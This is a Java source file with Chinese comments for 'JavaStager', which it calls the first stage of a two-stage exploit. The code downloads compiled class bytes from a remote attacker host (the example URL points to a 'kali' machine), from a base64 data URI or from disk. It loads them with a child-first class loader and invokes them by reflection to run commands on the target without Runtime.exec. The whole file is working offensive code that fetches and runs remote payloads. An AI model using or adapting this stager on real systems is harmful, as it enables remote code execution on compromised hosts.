import java.io.*;
import java.lang.reflect.Method;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.Base64;

/**
 * JavaStager —— 两阶段利用的第一阶段：加载二进制 class 并反射调用。
 *
 * 用法（已被第一阶段 EXP 加载后）：
 *   Object out = JavaStager.run("http://<kali>:8000/JavaCmd.class", "JavaCmd", "exec", "ls /");
 *
 * 阶段 1（本类，体积小、逻辑单一）：只负责“取字节 -> defineClass -> 反射调用”，
 * 不含任何具体命令逻辑。阶段 2（如 JavaCmd.class）：承载文件/网络/系统信息的
 * Java 实现，不依赖 Runtime.exec / ProcessBuilder。
 *
 * 支持来源：
 *   - http(s)://...            远程 class
 *   - data:application/octet-stream;base64,...   内联 class（无外连场景）
 *   - file:///abs/path.class   本地落盘 class
 *
 * 兼容 JDK 6+ 语法（实际编译目标 8），不依赖第三方库。
 */
public class JavaStager {
    private static final int MAX_CLASS = 4 * 1024 * 1024;

    /** 下载 class、定义并反射调用其静态方法。 */
    public static Object run(String source, String className, String method, String arg) throws Exception {
        byte[] bytes = fetch(source);
        StagerLoader loader = new StagerLoader(JavaStager.class.getClassLoader(), source);
        Class<?> clz = loader.define(className, bytes);
        Method m;
        if (arg == null) {
            m = clz.getMethod(method);
            return m.invoke(null);
        }
        m = clz.getMethod(method, String.class);
        return m.invoke(null, arg);
    }

    /** 仅加载返回 Class，便于后续多次调用（同一 loader 内可共享静态状态）。 */
    public static Class<?> load(String source, String className) throws Exception {
        return new StagerLoader(JavaStager.class.getClassLoader(), source).define(className, fetch(source));
    }

    private static byte[] fetch(String source) throws IOException {
        if (source.startsWith("data:")) {
            int comma = source.indexOf(',');
            if (comma < 0) throw new IOException("bad data URI");
            String meta = source.substring(5, comma);
            String payload = source.substring(comma + 1);
            if (meta.contains("base64")) return Base64.getDecoder().decode(payload);
            return URLDecoder.decode(payload, "UTF-8").getBytes(StandardCharsets.UTF_8);
        }
        if (source.startsWith("file:")) {
            return Files.readAllBytes(Paths.get(URI.create(source)));
        }
        URLConnection conn = new URL(source).openConnection();
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(8000);
        conn.setRequestProperty("User-Agent", "JavaStager/1.0");
        InputStream in = conn.getInputStream();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        try {
            while ((n = in.read(buf)) != -1) {
                bos.write(buf, 0, n);
                if (bos.size() > MAX_CLASS) throw new IOException("class too large");
            }
        } finally {
            in.close();
        }
        return bos.toByteArray();
    }

    /** 子优先 loader：避免目标容器已有同名类时命中旧版本；缺省包内联类优先自取。 */
    static final class StagerLoader extends ClassLoader {
        private final String source;

        StagerLoader(ClassLoader parent, String source) {
            super(parent);
            this.source = source;
        }

        Class<?> define(String name, byte[] bytes) {
            return defineClass(name, bytes, 0, bytes.length);
        }

        protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
            synchronized (getClassLoadingLock(name)) {
                Class<?> c = findLoadedClass(name);
                if (c == null) {
                    // 缺省包（无点号）通常是 payload 自身及其匿名/嵌套类，优先用同一
                    // class 目录的字节，避免父 loader 命中不同来源导致 IllegalAccessError。
                    if (name.indexOf('.') < 0) {
                        c = trySibling(name);
                    }
                    if (c == null) {
                        try {
                            c = super.loadClass(name, false);
                        } catch (ClassNotFoundException e) {
                            c = trySibling(name);
                            if (c == null) throw e;
                        }
                    }
                }
                if (resolve) resolveClass(c);
                return c;
            }
        }

        private Class<?> trySibling(String name) {
            try {
                byte[] b = fetchSibling(source, name);
                return b == null ? null : defineClass(name, b, 0, b.length);
            } catch (Throwable t) {
                return null;
            }
        }
    }

    /** 由入口 class 的 URL 推导同目录下其它 class 的地址并下载。 */
    private static byte[] fetchSibling(String source, String className) {
        try {
            String file = className.replace('.', '/') + ".class";
            if (source.startsWith("file:")) {
                int slash = source.lastIndexOf('/');
                String dir = slash > 0 ? source.substring(0, slash + 1) : source;
                return Files.readAllBytes(Paths.get(URI.create(dir + file)));
            }
            if (source.startsWith("http")) {
                int slash = source.lastIndexOf('/');
                String dir = slash > 0 ? source.substring(0, slash + 1) : source;
                return fetch(dir + file);
            }
        } catch (Throwable ignored) {
        }
        return null;
    }
}
